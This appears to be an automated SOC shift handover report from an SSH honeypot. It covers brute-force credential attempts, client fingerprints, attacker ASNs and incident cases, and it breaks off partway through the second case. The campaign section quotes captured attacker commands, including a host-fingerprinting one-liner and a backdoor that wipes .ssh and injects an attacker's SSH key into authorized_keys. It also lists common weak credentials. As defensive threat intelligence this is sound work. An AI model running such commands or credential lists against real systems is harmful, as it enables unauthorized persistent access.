# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-25 |
| **Generated At** | 2026-08-25T08:48:55Z |
| **Shift Time** | 08:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **403** |
| Confirmed Threats | **390** |
| False Positives Filtered | **13** (3.2%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **18** |
| High Severity Cases | **277** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **126** |
| Malware Samples Analyzed | **2** HIGH · **20** MED · 22 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **286** |
| Unique Credential Pairs | **264** |
| Unique Usernames | **93** |
| Unique Passwords | **202** |
| Successful Auth Pairs | **275** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 94 |
| `admin` | 26 |
| `ubuntu` | 17 |
| `backup` | 8 |
| `administrator` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 16 |
| `admin` | 9 |
| `123` | 7 |
| `password` | 7 |
| `1234` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 5 |
| `support` | `support` | 4 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `admin` | 3 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `claude` | `abc123` | `45.156.87.13` | 2026-08-25T04:55:04 |
| `root` | `modzmodz` | `45.156.87.13` | 2026-08-25T04:55:08 |
| `sftpuser` | `sftpuser` | `45.156.87.13` | 2026-08-25T04:55:13 |
| `root` | `admin` | `45.156.87.13` | 2026-08-25T04:55:18 |
| `dev` | `dev` | `45.156.87.13` | 2026-08-25T04:55:22 |
| `teamspeak` | `root` | `45.156.87.13` | 2026-08-25T04:55:27 |
| `admins` | `admins` | `45.156.87.13` | 2026-08-25T04:55:32 |
| `root` | `1236547890` | `45.156.87.13` | 2026-08-25T04:55:37 |
| `admin` | `123qwe` | `80.94.92.55` | 2026-08-25T04:55:40 |
| `operator` | `operator00` | `45.156.87.13` | 2026-08-25T04:55:42 |
| `master` | `passwd` | `45.156.87.13` | 2026-08-25T04:55:46 |
| `appuser` | `123456` | `45.156.87.13` | 2026-08-25T04:55:51 |
| `hu` | `123456` | `45.156.87.13` | 2026-08-25T04:55:56 |
| `rocky` | `1234` | `45.156.87.13` | 2026-08-25T04:56:00 |
| `root` | `backup1234` | `45.156.87.13` | 2026-08-25T04:56:05 |
| `vncuser` | `123456` | `45.156.87.13` | 2026-08-25T04:56:09 |
| `botuser` | `123` | `45.156.87.13` | 2026-08-25T04:56:14 |
| `root` | `qq123456` | `45.156.87.13` | 2026-08-25T04:56:19 |
| `playground` | `playground` | `45.156.87.13` | 2026-08-25T04:56:24 |
| `ali` | `ali` | `45.156.87.13` | 2026-08-25T04:56:29 |
| `ec2-user` | `123123` | `45.156.87.13` | 2026-08-25T04:56:34 |
| `ftpuser` | `ftpuser123` | `45.156.87.13` | 2026-08-25T04:56:39 |
| `dolphinscheduler` | `dolphinscheduler` | `45.156.87.13` | 2026-08-25T04:56:43 |
| `ivan` | `ivan` | `45.156.87.13` | 2026-08-25T04:56:48 |
| `cloud` | `1234` | `45.156.87.13` | 2026-08-25T04:56:53 |
| `steam` | `steam!` | `165.154.147.69` | 2026-08-25T04:56:56 |
| `webuser` | `webuser` | `45.156.87.13` | 2026-08-25T04:56:58 |
| `345gs5662d34` | `345gs5662d34` | `165.154.147.69` | 2026-08-25T04:57:01 |
| `steam` | `3245gs5662d34` | `165.154.147.69` | 2026-08-25T04:57:02 |
| `user` | `git` | `45.156.87.13` | 2026-08-25T04:57:02 |
| `t1` | `123` | `45.156.87.13` | 2026-08-25T04:57:07 |
| `jenkins` | `jenkins` | `45.156.87.13` | 2026-08-25T04:57:11 |
| `ubuntu` | `test#123` | `217.60.255.130` | 2026-08-25T04:57:15 |
| `user1` | `123` | `45.156.87.13` | 2026-08-25T04:57:16 |
| `root` | `mario` | `217.60.255.130` | 2026-08-25T04:57:18 |
| `root` | `12345qwert` | `45.156.87.13` | 2026-08-25T04:57:21 |
| `test` | `123456` | `45.156.87.13` | 2026-08-25T04:57:26 |
| `test3` | `1` | `45.156.87.13` | 2026-08-25T04:57:30 |
| `root` | `password@123` | `45.156.87.13` | 2026-08-25T04:57:35 |
| `user1` | `modzmodz` | `45.156.87.13` | 2026-08-25T04:57:39 |
| `webadmin` | `123` | `45.156.87.13` | 2026-08-25T04:57:44 |
| `rancher` | `rancher` | `45.156.87.13` | 2026-08-25T04:57:49 |
| `root` | `11223344` | `45.156.87.13` | 2026-08-25T04:57:54 |
| `admin` | `123qwerty` | `80.94.92.55` | 2026-08-25T04:57:56 |
| `admin` | `1qaz@WSX` | `45.156.87.13` | 2026-08-25T04:57:59 |
| `root` | `Ab123456` | `45.156.87.13` | 2026-08-25T04:58:03 |
| `root` | `root@123` | `45.156.87.13` | 2026-08-25T04:58:08 |
| `root` | `12345` | `45.156.87.13` | 2026-08-25T04:58:13 |
| `root` | `Password1234!@` | `45.156.87.13` | 2026-08-25T04:58:18 |
| `root` | `linux123` | `45.156.87.13` | 2026-08-25T04:58:23 |
| `root` | `passwd1` | `45.156.87.13` | 2026-08-25T04:58:27 |
| `debian` | `debian` | `45.156.87.13` | 2026-08-25T04:58:32 |
| `root` | `123qwe!@` | `45.156.87.13` | 2026-08-25T04:58:37 |
| `admin` | `090807` | `45.156.87.13` | 2026-08-25T04:58:42 |
| `tomcat` | `tomcat` | `45.156.87.13` | 2026-08-25T04:58:47 |
| `root` | `1qazxsw2` | `45.156.87.13` | 2026-08-25T04:58:52 |
| `root` | `123123asd` | `45.156.87.13` | 2026-08-25T04:58:57 |
| `factorio` | `factorio` | `45.156.87.13` | 2026-08-25T04:59:02 |
| `root` | `qwerty777` | `45.156.87.13` | 2026-08-25T04:59:07 |
| `sysupdate` | `Password1` | `45.156.87.13` | 2026-08-25T04:59:12 |
| `root` | `159357258` | `45.156.87.13` | 2026-08-25T04:59:17 |
| `esroot` | `esroot` | `45.156.87.13` | 2026-08-25T04:59:22 |
| `kipt` | `kipt` | `45.156.87.13` | 2026-08-25T04:59:26 |
| `testuser` | `testuser` | `45.156.87.13` | 2026-08-25T04:59:31 |
| `root` | `11` | `45.156.87.13` | 2026-08-25T04:59:36 |
| `data` | `data` | `45.156.87.13` | 2026-08-25T04:59:40 |
| `root` | `Huawei@123` | `45.156.87.13` | 2026-08-25T04:59:45 |
| `root` | `demo` | `45.156.87.13` | 2026-08-25T04:59:50 |
| `root` | `Welcome123` | `45.156.87.13` | 2026-08-25T04:59:54 |
| `root` | `rootroot` | `45.156.87.13` | 2026-08-25T04:59:59 |
| `root` | `root123456.` | `45.156.87.13` | 2026-08-25T05:00:04 |
| `admin` | `21` | `80.94.92.55` | 2026-08-25T05:00:06 |
| `root` | `741852963` | `45.156.87.13` | 2026-08-25T05:00:09 |
| `nginx` | `toor` | `45.156.87.13` | 2026-08-25T05:00:13 |
| `deploy` | `qwerty` | `45.156.87.13` | 2026-08-25T05:00:18 |
| `crafty` | `crafty` | `45.156.87.13` | 2026-08-25T05:00:23 |
| `odoo18` | `odoo18` | `45.156.87.13` | 2026-08-25T05:00:28 |
| `username` | `password` | `45.156.87.13` | 2026-08-25T05:00:33 |
| `administrator` | `Passw0rd` | `45.156.87.13` | 2026-08-25T05:00:37 |
| `bob` | `bob` | `45.156.87.13` | 2026-08-25T05:00:42 |
| `steam` | `steam123` | `45.156.87.13` | 2026-08-25T05:00:47 |
| `git` | `git123` | `45.156.87.13` | 2026-08-25T05:00:52 |
| `root` | `1234!@` | `45.156.87.13` | 2026-08-25T05:00:56 |
| `root` | `111` | `45.156.87.13` | 2026-08-25T05:01:01 |
| `pi` | `pi` | `45.156.87.13` | 2026-08-25T05:01:06 |
| `root` | `1qaz@WSX` | `45.156.87.13` | 2026-08-25T05:01:11 |
| `ubuntu` | `qwerty123` | `45.156.87.13` | 2026-08-25T05:01:15 |
| `root` | `74123698` | `45.156.87.13` | 2026-08-25T05:01:20 |
| `minecraft` | `1` | `45.156.87.13` | 2026-08-25T05:01:24 |
| `root` | `1qazXSW@` | `45.156.87.13` | 2026-08-25T05:01:29 |
| `ai` | `ai` | `45.156.87.13` | 2026-08-25T05:01:33 |
| `root` | `a123456A` | `45.156.87.13` | 2026-08-25T05:01:38 |
| `dmdba` | `dmdba` | `45.156.87.13` | 2026-08-25T05:01:42 |
| `user` | `rootroot` | `45.156.87.13` | 2026-08-25T05:01:47 |
| `mohammad` | `mohammad` | `45.156.87.13` | 2026-08-25T05:01:51 |
| `a` | `a` | `45.156.87.13` | 2026-08-25T05:01:56 |
| `user` | `user123456` | `45.156.87.13` | 2026-08-25T05:02:00 |
| `alex` | `12345678` | `45.156.87.13` | 2026-08-25T05:02:04 |
| `root` | `Aa123123` | `45.156.87.13` | 2026-08-25T05:02:09 |
| `root` | `19821031` | `45.156.87.13` | 2026-08-25T05:02:13 |
| `admin` | `321` | `80.94.92.55` | 2026-08-25T05:02:14 |
| `root` | `qwe123!@` | `45.156.87.13` | 2026-08-25T05:02:18 |
| `root` | `Password12` | `45.156.87.13` | 2026-08-25T05:02:22 |
| `root` | `Aa12345678@` | `45.156.87.13` | 2026-08-25T05:02:27 |
| `pi` | `raspberry` | `45.156.87.13` | 2026-08-25T05:02:31 |
| `root` | `asdfasdf-space` | `45.156.87.13` | 2026-08-25T05:02:36 |
| `root` | `Admin123!` | `45.156.87.13` | 2026-08-25T05:02:40 |
| `admin` | `admin123!` | `45.156.87.13` | 2026-08-25T05:02:45 |
| `debian` | `123` | `45.156.87.13` | 2026-08-25T05:02:49 |
| `operator` | `operator` | `45.156.87.13` | 2026-08-25T05:02:54 |
| `root` | `root1234` | `45.156.87.13` | 2026-08-25T05:02:59 |
| `es` | `es123456` | `45.156.87.13` | 2026-08-25T05:03:03 |
| `worker` | `worker` | `45.156.87.13` | 2026-08-25T05:03:08 |
| `kevin` | `kevin` | `45.156.87.13` | 2026-08-25T05:03:13 |
| `grid` | `grid` | `45.156.87.13` | 2026-08-25T05:03:17 |
| `admin` | `admin1234` | `45.156.87.13` | 2026-08-25T05:03:21 |
| `root` | `qwer@1234` | `45.156.87.13` | 2026-08-25T05:03:26 |
| `backup` | `backup` | `45.156.87.13` | 2026-08-25T05:03:31 |
| `user2` | `1` | `45.156.87.13` | 2026-08-25T05:03:35 |
| `root` | `!QAZ2wsx` | `45.156.87.13` | 2026-08-25T05:03:40 |
| `deploy` | `toor` | `45.156.87.13` | 2026-08-25T05:03:44 |
| `master` | `master` | `45.156.87.13` | 2026-08-25T05:03:49 |
| `developer` | `dev` | `45.156.87.13` | 2026-08-25T05:03:53 |
| `root` | `admin123` | `45.156.87.13` | 2026-08-25T05:03:57 |
| `root` | `19860710` | `45.156.87.13` | 2026-08-25T05:04:02 |
| `deploy` | `1234` | `45.156.87.13` | 2026-08-25T05:04:06 |
| `root` | `999` | `45.156.87.13` | 2026-08-25T05:04:11 |
| `aiuser` | `aiuser` | `45.156.87.13` | 2026-08-25T05:04:16 |
| `frappe` | `admin` | `45.156.87.13` | 2026-08-25T05:04:20 |
| `admin` | `654321` | `80.94.92.55` | 2026-08-25T05:04:24 |
| `user2` | `ZAQ!xsw2` | `45.156.87.13` | 2026-08-25T05:04:25 |
| `odoo18` | `123` | `45.156.87.13` | 2026-08-25T05:04:29 |
| `test` | `test1` | `45.156.87.13` | 2026-08-25T05:04:34 |
| `test` | `abc123` | `45.156.87.13` | 2026-08-25T05:04:39 |
| `root` | `admin1234` | `45.156.87.13` | 2026-08-25T05:04:44 |
| `admin` | `123321` | `45.156.87.13` | 2026-08-25T05:04:48 |
| `root` | `qwe@123` | `45.156.87.13` | 2026-08-25T05:04:53 |
| `almalinux` | `almalinux` | `45.156.87.13` | 2026-08-25T05:04:58 |
| `cloud` | `Wangsu@2017` | `45.156.87.13` | 2026-08-25T05:05:02 |
| `root` | `Aa123456.` | `45.156.87.13` | 2026-08-25T05:05:07 |
| `trader` | `trader` | `45.156.87.13` | 2026-08-25T05:05:12 |
| `developer` | `123` | `45.156.87.13` | 2026-08-25T05:05:17 |
| `admin` | `admin` | `165.245.172.73` | 2026-08-25T05:05:19 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-25T05:05:20 |
| `guest` | `abc123` | `45.156.87.13` | 2026-08-25T05:05:22 |
| `coder` | `123456` | `45.156.87.13` | 2026-08-25T05:05:26 |
| `rdpuser` | `rdpuser` | `45.156.87.13` | 2026-08-25T05:05:31 |
| `root` | `26262626` | `45.156.87.13` | 2026-08-25T05:05:35 |
| `jakob` | `jakob` | `45.156.87.13` | 2026-08-25T05:05:39 |
| `bitrix` | `bitrix` | `45.156.87.13` | 2026-08-25T05:05:44 |
| `lucas` | `lucas` | `45.156.87.13` | 2026-08-25T05:05:49 |
| `ubuntu` | `123456` | `45.156.87.13` | 2026-08-25T05:05:54 |
| `milad` | `milad123` | `45.156.87.13` | 2026-08-25T05:05:58 |
| `root` | `7` | `45.156.87.13` | 2026-08-25T05:06:03 |
| `root` | `QWEqwe123` | `45.156.87.13` | 2026-08-25T05:06:07 |
| `claude` | `123456` | `45.156.87.13` | 2026-08-25T05:06:12 |
| `sol` | `1234` | `45.156.87.13` | 2026-08-25T05:06:17 |
| `username` | `123456` | `45.156.87.13` | 2026-08-25T05:06:22 |
| `ubuntu` | `1qaz@WSX` | `45.156.87.13` | 2026-08-25T05:06:26 |
| `root` | `88888888` | `45.156.87.13` | 2026-08-25T05:06:31 |
| `admin` | `P@ssw0rd` | `80.94.92.55` | 2026-08-25T05:06:35 |
| `test` | `12345678` | `45.156.87.13` | 2026-08-25T05:06:36 |
| `support` | `asdf1234` | `45.156.87.13` | 2026-08-25T05:06:40 |
| `root` | `00008888` | `45.156.87.13` | 2026-08-25T05:06:45 |
| `ubuntu` | `Welcome@1234` | `217.60.255.130` | 2026-08-25T05:06:48 |
| `student` | `student` | `45.156.87.13` | 2026-08-25T05:06:49 |
| `root` | `123asdQWE` | `217.60.255.130` | 2026-08-25T05:06:52 |
| `student` | `123456` | `45.156.87.13` | 2026-08-25T05:06:54 |
| `ubuntu` | `qwe123456` | `45.156.87.13` | 2026-08-25T05:06:58 |
| `root` | `zaq12wsxcde3` | `45.156.87.13` | 2026-08-25T05:07:03 |
| `guest` | `guest` | `45.156.87.13` | 2026-08-25T05:07:08 |
| `nutanix` | `nutanix/4u` | `45.156.87.13` | 2026-08-25T05:07:12 |
| `deploy` | `1q2w3e4r` | `45.156.87.13` | 2026-08-25T05:07:17 |
| `guest` | `123456` | `45.156.87.13` | 2026-08-25T05:07:21 |
| `debian` | `toor` | `45.156.87.13` | 2026-08-25T05:07:26 |
| `elasticsearch` | `123456` | `45.156.87.13` | 2026-08-25T05:07:31 |
| `root` | `Abcd1234` | `45.156.87.13` | 2026-08-25T05:07:36 |
| `Caps` | `Caps` | `45.156.87.13` | 2026-08-25T05:07:41 |
| `elasticsearch` | `elasticsearch@1234` | `45.156.87.13` | 2026-08-25T05:07:46 |
| `codex` | `codex` | `45.156.87.13` | 2026-08-25T05:07:51 |
| `jenkins` | `jenkins@123` | `45.156.87.13` | 2026-08-25T05:07:56 |
| `rocky` | `rocky` | `45.156.87.13` | 2026-08-25T05:08:02 |
| `main` | `1234` | `45.156.87.13` | 2026-08-25T05:08:06 |
| `dev` | `123456` | `45.156.87.13` | 2026-08-25T05:08:11 |
| `root` | `pass` | `45.156.87.13` | 2026-08-25T05:08:15 |
| `root` | `redhat` | `45.156.87.13` | 2026-08-25T05:08:20 |
| `admin` | `123456789` | `45.156.87.13` | 2026-08-25T05:08:25 |
| `ark` | `ark` | `45.156.87.13` | 2026-08-25T05:08:29 |
| `vyos` | `vyos` | `45.156.87.13` | 2026-08-25T05:08:34 |
| `opc` | `123456` | `45.156.87.13` | 2026-08-25T05:08:39 |
| `root` | `12345qwe` | `45.156.87.13` | 2026-08-25T05:08:44 |
| `admin` | `Password` | `80.94.92.55` | 2026-08-25T05:08:46 |
| `claude` | `claude` | `45.156.87.13` | 2026-08-25T05:08:49 |
| `www` | `www` | `45.156.87.13` | 2026-08-25T05:08:54 |
| `core` | `P@ssw0rd` | `45.156.87.13` | 2026-08-25T05:08:59 |
| `postgres` | `1` | `45.156.87.13` | 2026-08-25T05:09:04 |
| `admin` | `admin` | `80.94.92.55` | 2026-08-25T05:11:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.179.139` | 2026-08-25T05:11:10 |
| `*1` | `$4` | `34.77.179.139` | 2026-08-25T05:11:23 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5462` | `34.77.179.139` | 2026-08-25T05:11:25 |
| `admin` | `admin12` | `80.94.92.55` | 2026-08-25T05:13:05 |
| `admin` | `admin123` | `80.94.92.55` | 2026-08-25T05:15:04 |
| `ubuntu` | `nginx#123` | `217.60.255.130` | 2026-08-25T05:16:26 |
| `root` | `data@123` | `217.60.255.130` | 2026-08-25T05:16:29 |
| `admin` | `admin2026` | `80.94.92.55` | 2026-08-25T05:17:07 |
| `support` | `support` | `176.53.159.196` | 2026-08-25T05:18:35 |
| `admin` | `letmein` | `80.94.92.55` | 2026-08-25T05:19:10 |
| `admin` | `pa$w0rd` | `80.94.92.55` | 2026-08-25T05:21:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.239.64.155` | 2026-08-25T05:23:26 |
| `admin` | `passw0rd` | `80.94.92.55` | 2026-08-25T05:23:28 |
| `admin` | `password` | `80.94.92.55` | 2026-08-25T05:25:40 |
| `ubuntu` | `master@123` | `217.60.255.130` | 2026-08-25T05:25:56 |
| `root` | `Sys@1234` | `217.60.255.130` | 2026-08-25T05:26:00 |
| `admin` | `qwerty` | `80.94.92.55` | 2026-08-25T05:27:45 |
| `administrator` | `123456` | `80.94.92.55` | 2026-08-25T05:29:52 |
| `administrator` | `P@ssw0rd` | `80.94.92.55` | 2026-08-25T05:32:01 |
| `administrator` | `administrator` | `80.94.92.55` | 2026-08-25T05:34:11 |
| `ubuntu` | `Admin@2017` | `217.60.255.130` | 2026-08-25T05:35:25 |
| `root` | `liuyang` | `217.60.255.130` | 2026-08-25T05:35:29 |
| `administrator` | `administrator123` | `80.94.92.55` | 2026-08-25T05:36:27 |
| `administrator` | `passw0rd` | `80.94.92.55` | 2026-08-25T05:38:39 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-25T05:39:27 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-25T05:39:28 |
| `administrator` | `password` | `80.94.92.55` | 2026-08-25T05:40:50 |
| `support` | `support` | `10.0.0.73` | 2026-08-25T05:42:17 |
| `ansible` | `123456` | `80.94.92.55` | 2026-08-25T05:42:57 |
| `ansible` | `ansible` | `80.94.92.55` | 2026-08-25T05:44:58 |
| `ubuntu` | `qqq` | `217.60.255.130` | 2026-08-25T05:45:06 |
| `root` | `@dministrat0r` | `217.60.255.130` | 2026-08-25T05:45:09 |
| `ansible` | `ansible123` | `80.94.92.55` | 2026-08-25T05:47:02 |
| `ansible` | `passw0rd` | `80.94.92.55` | 2026-08-25T05:49:05 |
| `ansible` | `password` | `80.94.92.55` | 2026-08-25T05:51:10 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-25T05:52:35 |
| `apache` | `P@ssw0rd` | `80.94.92.55` | 2026-08-25T05:53:20 |
| `ubuntu` | `1qaz2wsx@` | `217.60.255.130` | 2026-08-25T05:54:50 |
| `root` | `Phuong123` | `217.60.255.130` | 2026-08-25T05:54:56 |
| `apache` | `apache` | `80.94.92.55` | 2026-08-25T05:55:36 |
| `apache` | `password` | `80.94.92.55` | 2026-08-25T05:57:43 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.79.176.96` | 2026-08-25T05:58:58 |
| `*1` | `$4` | `34.79.176.96` | 2026-08-25T05:59:11 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4594` | `34.79.176.96` | 2026-08-25T05:59:13 |
| `backup` | `123qwe` | `80.94.92.55` | 2026-08-25T05:59:48 |
| `backup` | `54321` | `80.94.92.55` | 2026-08-25T06:01:56 |
| `backup` | `backup` | `80.94.92.55` | 2026-08-25T06:04:02 |
| `ubuntu` | `postgres@2025` | `217.60.255.130` | 2026-08-25T06:04:23 |
| `root` | `Admin@123123` | `217.60.255.130` | 2026-08-25T06:04:27 |
| `backup` | `backup12` | `80.94.92.55` | 2026-08-25T06:06:12 |
| `backup` | `backup123` | `80.94.92.55` | 2026-08-25T06:08:22 |
| `root` | `admin` | `84.217.31.52` | 2026-08-25T06:09:55 |
| `admin` | `admin` | `47.77.182.54` | 2026-08-25T06:10:09 |
| `backup` | `password` | `80.94.92.55` | 2026-08-25T06:10:30 |
| `backup` | `wasd` | `80.94.92.55` | 2026-08-25T06:12:40 |
| `ubuntu` | `Passw0rd1234` | `217.60.255.130` | 2026-08-25T06:14:08 |
| `root` | `fuckyou@123` | `217.60.255.130` | 2026-08-25T06:14:12 |
| `ubuntu` | `asd` | `217.60.255.130` | 2026-08-25T06:23:44 |
| `root` | `P@ssWord123` | `217.60.255.130` | 2026-08-25T06:23:47 |
| `ubuntu` | `Hello@123` | `217.60.255.130` | 2026-08-25T06:33:24 |
| `root` | `Pass123$` | `217.60.255.130` | 2026-08-25T06:33:28 |
| `root` | `admin` | `2.57.122.150` | 2026-08-25T06:42:16 |
| `ubuntu` | `Security@123` | `217.60.255.130` | 2026-08-25T06:43:07 |
| `root` | `Admin@@123` | `217.60.255.130` | 2026-08-25T06:43:10 |
| `root` | `password` | `2.57.122.150` | 2026-08-25T06:43:22 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-25T06:44:49 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-25T06:44:50 |
| `root` | `toor` | `2.57.122.150` | 2026-08-25T06:45:35 |
| `root` | `qwerty` | `2.57.122.150` | 2026-08-25T06:46:41 |
| `root` | `12345` | `2.57.122.150` | 2026-08-25T06:47:45 |
| `root` | `letmein` | `2.57.122.150` | 2026-08-25T06:48:50 |
| `root` | `123456789` | `2.57.122.150` | 2026-08-25T06:49:54 |
| `root` | `admin123` | `2.57.122.150` | 2026-08-25T06:51:01 |
| `root` | `welcome` | `2.57.122.150` | 2026-08-25T06:52:09 |
| `ubuntu` | `qwerty@123` | `217.60.255.130` | 2026-08-25T06:52:39 |
| `root` | `Qwert@12345` | `217.60.255.130` | 2026-08-25T06:52:43 |
| `root` | `P@ssw0rd` | `2.57.122.150` | 2026-08-25T06:53:17 |
| `root` | `passw0rd` | `2.57.122.150` | 2026-08-25T06:54:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **403** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 238 |
| libssh | 40 |
| Paramiko (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 180 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 50 | 2 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 180 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 50 | 2 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 48 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`, `2.57.122.150`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.147.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **27** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |
| `AS6939` | Hurricane Electric LLC | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS398722` | Censys, Inc. | 1 | HIGH |
| `AS22927` | Telefonica de Argentina | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (277)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-83965c65b812

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:04` | `cowrie.client.version` |
| `2026-08-25 04:55:04` | `cowrie.client.kex` |
| `2026-08-25 04:55:04` | `cowrie.login.success` |
| `2026-08-25 04:55:06` | `cowrie.session.params` |
| `2026-08-25 04:55:06` | `cowrie.command.input` |
| `2026-08-25 04:55:06` | `cowrie.log.closed` |
| `2026-08-25 04:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45bdd8c9578a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:08` | `cowrie.session.connect` |
| `2026-08-25 04:55:08` | `cowrie.client.version` |
| `2026-08-25 04:55:08` | `cowrie.client.kex` |
| `2026-08-25 04:55:08` | `cowrie.login.success` |
| `2026-08-25 04:55:09` | `cowrie.session.params` |
| `2026-08-25 04:55:09` | `cowrie.command.input` |
